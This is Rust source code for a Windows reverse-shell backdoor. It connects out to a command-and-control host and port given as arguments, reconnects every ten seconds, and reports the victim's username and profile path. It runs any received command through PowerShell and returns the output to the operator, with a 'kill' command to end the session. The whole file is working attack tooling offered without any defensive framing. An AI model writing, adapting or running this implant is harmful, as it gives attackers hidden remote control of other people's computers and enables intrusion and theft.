use std::{
    env, 
    io::{self, Read, Write}, 
    net::{IpAddr, TcpStream, ToSocketAddrs}, 
    process::Command, 
    thread, 
    time::Duration
};

struct C2 {
    address: String,
    port: u16
}

impl C2 {
    fn new(address: &str, port: u16) -> Self {
        Self { 
            address: String::from(address), 
            port 
        }
    }

    fn is_domain(&self) -> bool {
        if let Ok(mut addrs_iter) = format!("{}:0", self.address).to_socket_addrs() {
            if addrs_iter.next().is_some() {
                return true;
            }
        }

        false
    }

    fn is_ip(&self) -> bool {
        self.address.parse::<IpAddr>().is_ok()
    }

    fn get_address(&self) -> Result<String, io::Error> {
        let address = format!("{}:{}", self.address, self.port); 

        if !self.is_domain() && !self.is_ip() {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData, 
                format!("Failed to validate C2 address: {}", address)
            ));
        }

        Ok(address)
    }
}

enum EnvVars {
    Profile,
    Name,
}

impl EnvVars {
    pub fn get_value(&self) -> String {
        let alt = String::from("n/a");

        match self {
            EnvVars::Profile => env::var("USERPROFILE").unwrap_or_else(|_| alt),
            EnvVars::Name => env::var("USERNAME").unwrap_or_else(|_| alt),
        }
    }
}

fn capture_output(payload: &str) -> Result<String, io::Error> {
    let cmd = Command::new("powershell")
        .arg("-Command")
        .arg(payload)
        .output()
        .expect("Failed to execute payload");

    if !cmd.status.success() {
        let stderr = String::from_utf8_lossy(&cmd.stderr);
        return Err(io::Error::new(
            io::ErrorKind::Other, 
            format!("Failed to execute command: {}", stderr)
        ));
    }

    let stdout = String::from_utf8_lossy(&cmd.stdout).to_string();
    Ok(stdout)
}

fn connect(c2_address: &str) {
    'session: loop {
        let mut socket = match TcpStream::connect(c2_address) {
            Ok(tcp_stream) => tcp_stream,
            Err(err) => {
                eprintln!("Error establishing connection to c2: {}", err);
                thread::sleep(Duration::from_secs(10));
                continue 'session;
            }
        };

        'core_handler: loop {
            let env_name = EnvVars::Name.get_value();
            let env_profile = EnvVars::Profile.get_value();

            socket.write_fmt(format_args!("{}::{}::ps> ", env_name, env_profile)).unwrap();

            let mut buffer_payload = [0; 4096];
            socket.read(&mut buffer_payload).unwrap();

            let payload = String::from_utf8_lossy(&buffer_payload).to_string();
            let payload_trim = payload.trim_end_matches('\0').replace('\n', "");

            if payload_trim == "kill" {
                break 'session;
            }

            let payload_tok: Vec<&str> = payload_trim.split(" ").collect();
            if payload_tok[0] == "cd" {
                let result = if payload.len() >= 2 {
                    env::set_current_dir(payload_tok[1])
                } else {
                    env::set_current_dir(env_profile)
                };

                let target_path = payload_tok.get(1).unwrap_or(&"HOME");
        
                match result { 
                    Ok(_) => socket.write_fmt(format_args!(
                            "Current directory changed to {}\n", 
                            target_path
                        )).unwrap(),
                    Err(err) => socket.write_fmt(format_args!(
                            "cd: {}: {}\n", 
                            target_path, err
                        )).unwrap()
                }

                continue 'core_handler;
            }

            match capture_output(&payload_trim) {
                Ok(stdout) => {
                    if let Err(err) = socket.write_fmt(format_args!("Stdout: {}", stdout)) {
                        eprintln!("Failed to write output to socket: {}", err);
                        break 'core_handler;
                    }
                },
                Err(stderr) => {
                    if let Err(err) = socket.write_fmt(format_args!("Stderr: {}", stderr)) {
                        eprintln!("Failed to write command error to socket: {}", err);
                        break 'core_handler;
                    }
                }
            }
        }
    }
}

fn parse_args_cli() -> Option<C2> {
    let args: Vec<String> = env::args().collect();
    if args.len() == 1 {
        return None;
    }

    let c2_address = String::from(&args[1]);
    if let Ok(c2_port) = &args[2].parse::<u16>() {
        return Some(C2 { address: c2_address, port: *c2_port });
    }

    None
}

fn main() {
    let settings = match parse_args_cli() {
        Some(settings) => settings,
        None => {
            eprintln!("Usage: {} <c2_address> <c2_port>", env::args().nth(0).unwrap());
            return;
        }
    };

    let c2 = C2::new(&settings.address, settings.port);

    match c2.get_address() {
        Ok(c2_address) => connect(&c2_address),
        Err(err) => eprintln!("Error: {}", err)
    }
}
